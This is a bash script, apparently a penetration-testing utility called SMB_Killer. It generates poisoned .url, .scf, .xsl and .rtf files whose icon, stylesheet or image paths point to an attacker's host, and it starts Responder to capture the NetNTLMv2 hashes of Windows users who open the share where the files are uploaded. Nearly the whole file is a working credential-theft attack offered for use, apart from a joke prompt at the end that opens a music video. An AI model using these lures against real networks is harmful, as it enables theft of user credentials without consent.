#!/bin/bash

#Try to grab NetNTLMv2 hash when uploading to SMB

echo -e '\E[31;40m' "Script used for SMB when uploading file to get NetNTLMv2 hash"; tput sgr0
echo -e '\E[32;40m' "For help use -h argument";tput sgr0
sleep 2
which terminator

if [ $? -ne 0 ]; then
	echo "Downloading terminator and doing and update"
	sudo apt install terminator
	sudo apt update
else 
	echo ""
fi
echo -e '\E[31;40m' "Making sure you have responder, if not downloading";tput sgr0
which responder
if [ $? -ne 0 ]; then
	echo "Downloading responder and doing and update"
	sudo apt install responder
	sudo apt update
else 
	echo ""
fi

Help()
{
   # Display Help
   echo "Please add one of the following functions"
   echo
   echo "options:"
   echo "u   	Make an url file to upload."
   echo "s   	Make a scf file to upload."
   echo "x   	Make an xml file to upload."
   echo "r	Make a rtf file to upload."
   echo "a	Make url,scf, and xml."
   echo "Example bash SMB_Killer.sh -x"
   echo
}

while getopts surxah flag
do
	case "${flag}" in

		u) 
		echo -e '\E[31;40m' "LHOST IP";tput sgr0
		read LHOST
		echo -e '\E[31;40m' "INT for responder (ex: eth0 or tun0):";tput sgr0
		read INT
		echo "[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\\\$LHOST\\%USERNAME%.icon
IconIndex=1" > @evil.url
		echo -e '\E[31;40m' "Upload @evil.url to Remote Share";tput sgr0
		terminator --new-tab -e "sudo responder -I $INT -wv"
		exit;;

		s) 
		echo -e '\E[31;40m' "LHOST IP";tput sgr0
		read LHOST
		echo -e '\E[31;40m' "INT for responder (ex: eth0 or tun0):";tput sgr0
		read INT
		echo "[Shell]
Command=2
IconFile=\\\\$LHOST\\tools\\nc.ico
[Taskbar]
Command=ToggleDesktop" > @evil.scf
		echo -e '\E[31;40m' "Upload @evil.scf to Remote Share";tput sgr0
		terminator --new-tab -e "sudo responder -I $INT -wv"
		exit;;

		x) 
		echo -e '\E[31;40m' "LHOST IP";tput sgr0
		read LHOST
		echo "<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
<?mso-application progid='Word.Document'?>
<?xml-stylesheet type='text/xsl' href='\\\\$LHOST\\bad.xsl' ?>" > @bad.xsl
		echo -e '\E[31;40m' "Upload @bad.xsl to Remote Share";tput sgr0
		terminator --new-tab -e "sudo responder -I $INT -wv"
		exit;;

		r) 
		echo -e '\E[31;40m' "LHOST IP";tput sgr0
		read LHOST
		echo -e '\E[31;40m' "INT for responder (ex: eth0 or tun0):";tput sgr0
		read INT
		echo "{\\rtf1{\\field{\\*\\fldinst {INCLUDEPICTURE "file://$LHOST/test.jpg" \\\\* MERGEFORMAT\\\\d}}{\fldrslt}}}" > test.rtf
		echo -e '\E[31;40m' "Upload @test.rtf to Remote Share";tput sgr0
		terminator --new-tab -e "sudo responder -I $INT -wv"
		exit;;

		a) 
		echo -e '\E[31;40m' "LHOST IP";tput sgr0
		read LHOST
		echo -e '\E[31;40m' "INT for responder (ex: eth0 or tun0):";tput sgr0
		read INT
		echo "[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\\\$LHOST\\%USERNAME%.icon
IconIndex=1" > @evil.url
		echo "[Shell]
Command=2
IconFile=\\\\$LHOST\\tools\\nc.ico
[Taskbar]
Command=ToggleDesktop" > @evil.scf
		echo "<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
<?mso-application progid='Word.Document'?>
<?xml-stylesheet type='text/xsl' href='\\\\$LHOST\\bad.xsl' ?>" > @bad.xsl
		echo "{\\rtf1{\\field{\\*\\fldinst {INCLUDEPICTURE "file://$LHOST/test.jpg" \\\\* MERGEFORMAT\\\\d}}{\fldrslt}}}" > test.rtf
		echo -e '\E[31;40m' "Upload @evil.scf to Remote Share";tput sgr0
		echo -e '\E[31;40m' "Upload @bad.xml to Remote Share";tput sgr0
		echo -e '\E[31;40m' "Upload @test.rtf to Remote Share";tput sgr0
		echo -e '\E[31;40m' "Upload @evil.url to Remote Share";tput sgr0
		terminator --new-tab -e "sudo responder -I $INT -wv"
		exit;;
		h) #display help
			Help
			exit;;
	esac
done

read -p "Now that we are done, did you want to listen to 21 Pilots? (y/n)" answer
if [ $answer = n ]; then
	echo -e '\E[31;40m' "BORING!!!!"
else
	echo -e '\E[31;40m' "My man, here you go"
	firefox "https://www.youtube.com/watch?v=UprcpdwuwCg"
fi

	
